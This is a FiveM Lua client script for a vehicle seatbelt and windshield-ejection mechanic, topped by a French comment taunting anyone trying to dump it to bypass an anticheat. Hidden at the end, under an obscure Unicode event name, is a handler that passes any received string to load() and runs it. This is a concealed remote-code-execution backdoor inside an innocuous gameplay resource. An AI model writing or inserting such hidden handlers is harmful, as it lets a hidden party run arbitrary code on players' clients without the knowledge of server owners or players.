-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local isUiOpen = false
local beltOn = false
local wasInCar = false
local speedBuffer = {}
local velBuffer = {}

function IsCar(veh)
	local vehClass = GetVehicleClass(veh)
	return (vehClass >= 0 and vehClass <= 7) or (vehClass >= 9 and vehClass <= 12) or (vehClass >= 17 and vehClass <= 20)
end

function Fwv(entity)
	local hr = GetEntityPhysicsHeading(entity) + 90.0

	if hr < 0.0 then
		hr = 360.0 + hr
	end

	hr = hr * 0.0174533

	return {x = math.cos(hr) * 2.0, y = math.sin(hr) * 2.0}
end

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyPed = PlayerPedId()
		local plyVehicle = GetVehiclePedIsIn(plyPed)

		if plyVehicle ~= 0 and (wasInCar or IsCar(plyVehicle)) then
			wasInCar = true

			if not beltOn and not isUiOpen and not IsPlayerDead(PlayerId()) and not IsPauseMenuActive() then
				isUiOpen = true
				SendNUIMessage({displayWindow = 'true'})
			end

			if beltOn then
				DisableControlAction(0, 75)
			end

			speedBuffer[2] = speedBuffer[1]
			speedBuffer[1] = GetEntitySpeed(plyVehicle)

			if speedBuffer[2] ~= nil and not beltOn and GetEntitySpeedVector(plyVehicle, true).y > 1.0 and speedBuffer[1] > 19.25 and (speedBuffer[2] - speedBuffer[1]) > (speedBuffer[1] * 0.255) then
				local plyCoords = GetEntityCoords(plyPed, false)
				local fw = Fwv(plyPed)

				SetEntityCoords(plyPed, plyCoords.x + fw.x, plyCoords.y + fw.y, plyCoords.z - 0.47, true, true, true)
				SetEntityVelocity(plyPed, velBuffer[2].x, velBuffer[2].y, velBuffer[2].z)
				Citizen.Wait(1)

				SetPedToRagdoll(plyPed, 1000, 1000, 0, 0, 0, 0)
			end

			velBuffer[2] = velBuffer[1]
			velBuffer[1] = GetEntityVelocity(plyVehicle)

			if IsControlJustReleased(0, 73) and GetLastInputMethod(0) then
				beltOn = not beltOn

				if beltOn then
					isUiOpen = true
					SendNUIMessage({displayWindow = 'false'})
				else
					isUiOpen = true
					SendNUIMessage({displayWindow = 'true'})
				end
			end
		elseif wasInCar then
			wasInCar = false
			beltOn = false
			speedBuffer[1], speedBuffer[2] = 0.0, 0.0

			if isUiOpen then
				isUiOpen = false
				SendNUIMessage({displayWindow = 'false'})
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(100)

		if (IsPlayerDead(PlayerId()) or IsPauseMenuActive()) and isUiOpen then
			isUiOpen = false
			SendNUIMessage({displayWindow = 'false'})
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)